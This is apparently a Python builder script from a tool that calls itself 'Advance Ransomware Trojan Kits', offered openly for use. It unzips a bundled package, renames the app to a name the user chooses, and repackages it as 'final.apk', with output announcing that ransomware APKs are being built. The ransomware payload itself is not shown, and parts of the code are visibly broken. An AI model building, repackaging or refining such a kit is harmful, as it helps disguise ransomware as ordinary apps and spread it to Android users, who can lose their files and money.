#! /usr/bin/env python3
#   Removed some unused modules
import os
import time
import fileinput


#   Called as class to be repurposed on other python file by importing this file
class colors:
	r = "\033[1;31m"
	g = "\033[1;32m"
	y = "\033[1;33m"
	b = "\033[1;34m"
	d = "\033[2;37m"
	R = "\033[1;41m"
	Y = "\033[1;43m"
	gr = "\033[2;37m"
	B = "\033[1;44m"
	w = "\033[0m"
	br = "\033[1;37;41m"
	bold = "\033[1m"


app_name = ""


def t_clear():
	#   To make it os friendly
	if os.name == "posix":
		os.system("clear")
	else:
		os.system("cls")


def banner():
	print(f"""{colors.bold}\t ___
\t|[_]| Advance Ransomware
\t|+ ;| Trojan Kits - {colors.br} ARTKs {colors.w}
\t`---'{colors.gr} Developed by: Kitty dev\n""")


def writefile(file, old, new):
	while True:
		if os.path.isfile(file):
			replaces = {old: new}
			for line in fileinput.input(file, inplace=True):
				for search in replaces:
					replaced = replaces[search]
					line = line.replace(search, replaced)
				print(line, end="")
			break
		else:
			exit(f"{colors.r}[!]{colors.w} Failed to write in file : {file}")


def start():
	global app_name
	t_clear()
	banner()
	while True:
		x = str(input(f"{colors.bold}{colors.r}>>{colors.w} {colors.bold}SET app_name:  {colors.y}"))
		if len(x) != 0 or x is None:
			app_name = x
			break
		else:
			continue
	print(f"{colors.w}* Building your ransomeware APK's ...\n{colors.w}{'-' * 43}{colors.d}")
	os.system("unzip beta.zip")
	print("I: Using strings ")
	smali = os.popen(f"find -L beta/ -name '*0000.smali'", "r").readline().strip()
	print("I: Using smali " + os.path.basename(smali))
	writefile("res/values/strings.xml", "appname", app_name)
	print(f"I: Adding name with {app_name}")
	time.sleep(3)
	os.system("zip final.apk resources.arsc classes.dex AndroidManifest.xml res org META-INF")


if __name__ == "__main__":
	try:
		#   Fix issue where colors remain
		print(colors.w)
		#   Auto Update "ONLY WORKS IF FILE IS CLONED NOT COPIED"
		os.system("git fetch")
		t_clear()
		start()
	except KeyboardInterrupt:
		exit(colors.r + "\n[!]" + colors.w + " Thanks for Using this tools\n    Join Us All \033[4mhttps://bit.ly/3PV3S3r/033[0m\n    exiting ...")
	#   Add fixes where color remains on unexpected exits on prompt
	except EOFError:
		exit(colors.r + "\n[!]" + colors.w + " Thanks for Using this tools\n    Join Us All \033[4mhttps://bit.ly/3PV3S3r/033[0m\n    exiting ...")
